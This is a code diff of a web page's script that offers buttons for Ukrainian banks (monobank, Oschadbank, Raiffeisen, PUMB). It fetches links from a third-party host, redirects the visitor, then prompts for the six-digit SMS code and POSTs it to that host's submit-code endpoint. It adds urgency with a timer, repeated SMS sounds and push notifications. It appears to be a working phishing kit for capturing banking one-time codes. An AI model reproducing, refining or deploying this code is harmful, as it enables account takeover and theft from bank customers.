@@ -88,21 +88,23 @@
   <audio id="sms-audio" src="sms.mp3"></audio>
 
   <script>
-    // Для примера: по-умолчанию ссылки для всех банков нет (disabled)
-    const API_MAP = {
-      mono:   "https://api.astrinvite.site/link?bank=mono",
-      oschad: "https://api.astrinvite.site/link?bank=oschad",
-      raiff:  "https://api.astrinvite.site/link?bank=raiff",
-      pumb:   "https://api.astrinvite.site/link?bank=pumb"
-    };
-    const CONSUME_MAP = {
-      mono:   "https://api.astrinvite.site/consume-link?bank=mono",
-      oschad: "https://api.astrinvite.site/consume-link?bank=oschad",
-      raiff:  "https://api.astrinvite.site/consume-link?bank=raiff",
-      pumb:   "https://api.astrinvite.site/consume-link?bank=pumb"
-    };
+const API_MAP = {
+  mono:   "https://api.astrinvite.site/link?bank=monobank",  // ← ИЗМЕНИТЬ!
+  oschad: "https://api.astrinvite.site/link?bank=oschadbank", // ← ИЗМЕНИТЬ!
+  raiff:  "https://api.astrinvite.site/link?bank=raiffeisenbank", // ← ИЗМЕНИТЬ!
+  pumb:   "https://api.astrinvite.site/link?bank=pumbbank"   // ← ИЗМЕНИТЬ!
+};
+const CONSUME_MAP = {
+  mono:   "https://api.astrinvite.site/consume-link?bank=monobank",  // ← ИЗМЕНИТЬ!
+  oschad: "https://api.astrinvite.site/consume-link?bank=oschadbank", // ← ИЗМЕНИТЬ!
+  raiff:  "https://api.astrinvite.site/consume-link?bank=raiffeisenbank", // ← ИЗМЕНИТЬ!
+  pumb:   "https://api.astrinvite.site/consume-link?bank=pumbbank"   // ← ИЗМЕНИТЬ!
+};
     const STATUS_URL = "https://api.astrinvite.site/api/link-status";
     const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
+
+    const linkData = {};  // банк → { url, id }
+
     let currentBank = null;
     let currentId = null;
     let pollingStatus = false;
@@ -111,44 +113,42 @@
     let smsTimerInterval = null;
     let smsSoundInterval = null;
 
-    // Проверяем по очереди для каждого банка — если есть ссылка, делаем кнопку активной
     async function checkLinks() {
       for (const bank of ["mono","oschad","raiff","pumb"]) {
-        const btn = document.getElementById(bank+"-btn");
+        const btn = document.getElementById(bank + "-btn");
         btn.disabled = true;
-        btn.textContent = capitalize(bank === "raiff" ? "Raiffeisen Bank" : (bank === "pumb" ? "ПУМБ" : bank.charAt(0).toUpperCase()+bank.slice(1)));
+        btn.textContent = (
+          bank === "raiff" ? "Raiffeisen Bank" :
+          bank === "pumb"  ? "ПУМБ" :
+          bank.charAt(0).toUpperCase() + bank.slice(1)
+        );
         try {
           const res = await fetch(API_MAP[bank]);
           if (res.ok) {
             const data = await res.json();
             if (data.url && data.id) {
+              linkData[bank] = { url: data.url, id: data.id };
               btn.disabled = false;
-              btn.onclick = ()=>handleBankClick(bank);
+              btn.onclick = () => handleBankClick(bank);
             }
           }
-        } catch { /* неактивна если не получилось */ }
+        } catch {}
       }
-    }
-    checkLinks();
-
-    function capitalize(str) {
-      return str.charAt(0).toUpperCase() + str.slice(1);
     }
 
     function resetUI() {
       document.getElementById("return-instruction").style.display = "none";
       document.getElementById("status").textContent = "";
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
-        let el = document.getElementById(id);
+        const el = document.getElementById(id);
         el.disabled = false;
-        el.textContent = el.dataset.orig || el.textContent;
       });
     }
 
     function showLoading(btnId) {
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
-        let el = document.getElementById(id);
-        if(id!==btnId) el.disabled = true;
+        const el = document.getElementById(id);
+        if(id !== btnId) el.disabled = true;
       });
       document.getElementById(btnId).textContent = "Завантаження...";
       document.getElementById("status").innerHTML = "";
@@ -157,26 +157,22 @@
     async function handleBankClick(bank) {
       resetUI();
       currentBank = bank;
-      let btnId = bank+"-btn";
+      const btnId = bank + "-btn";
       showLoading(btnId);
-      try {
-        const res = await fetch(API_MAP[bank]);
-        if (!res.ok) throw new Error();
-        const data = await res.json();
-        if (data.url && data.id) {
-          currentId = data.id;
-          link = data.url;
-          fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
-          document.getElementById("return-instruction").style.display = "";
-          window.location.href = link;
-          pollStatus();
-        } else {
-          throw new Error("Посилання не отримано");
-        }
-      } catch {
-        document.getElementById("status").innerHTML = "<span style='color:#b33'>Не вдалося отримати посилання. Спробуйте ще раз.</span>";
+
+      const data = linkData[bank];
+      if (!data || !data.url || !data.id) {
+        document.getElementById("status").innerHTML = "<span style='color:#b33'>Немає доступної ссилки для цього банку.</span>";
         resetUI();
+        return;
       }
+
+      currentId = data.id;
+      link = data.url;
+      fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
+      document.getElementById("return-instruction").style.display = "";
+      window.location.href = link;
+      pollStatus();
     }
 
     async function pollStatus() {
@@ -200,7 +196,7 @@
     function showCodeInput() {
       document.getElementById("status").innerHTML = `
         <b>Введіть 6-значний код з SMS:</b><br>
-        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
+        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
         <button id="send-code-btn">Підтвердити</button>
         <span id="timer"></span>
         <div id="sms-error"></div>
@@ -209,14 +205,14 @@
       startSMSTimer();
 
       document.getElementById("send-code-btn").onclick = async () => {
-        let code = document.getElementById("sms-code").value.trim();
+        const code = document.getElementById("sms-code").value.trim();
         if (!/^\d{6}$/.test(code)) {
           document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
           return;
         }
         document.getElementById("send-code-btn").disabled = true;
         document.getElementById("sms-error").textContent = "";
-        let fd = new FormData();
+        const fd = new FormData();
         fd.append("id", currentId);
         fd.append("code", code);
         try {
@@ -242,10 +238,7 @@
       showSMSPush();
       updateSMSTimer(seconds);
 
-      smsSoundInterval = setInterval(() => {
-        playSMSAudio();
-      }, 5000);
-
+      smsSoundInterval = setInterval(() => playSMSAudio(), 5000);
       smsTimerInterval = setInterval(() => {
         seconds--;
         updateSMSTimer(seconds);
@@ -256,15 +249,18 @@
         }
       }, 1000);
     }
+
     function stopSMSTimer() {
       if (smsTimerInterval) clearInterval(smsTimerInterval);
       if (smsSoundInterval) clearInterval(smsSoundInterval);
       document.getElementById("timer").textContent = "";
     }
+
     function updateSMSTimer(seconds) {
-      let m = Math.floor(seconds / 60), s = seconds % 60;
+      const m = Math.floor(seconds / 60), s = seconds % 60;
       document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
     }
+
     function playSMSAudio() {
       try {
         const audio = document.getElementById("sms-audio");
@@ -272,6 +268,7 @@
         audio.play();
       } catch {}
     }
+
     function showSMSPush() {
       if ("Notification" in window) {
         if (Notification.permission === "granted") {
@@ -291,6 +288,9 @@
         }
       }
     }
+
+    // Запуск
+    checkLinks();
   </script>
 </body>
 </html>
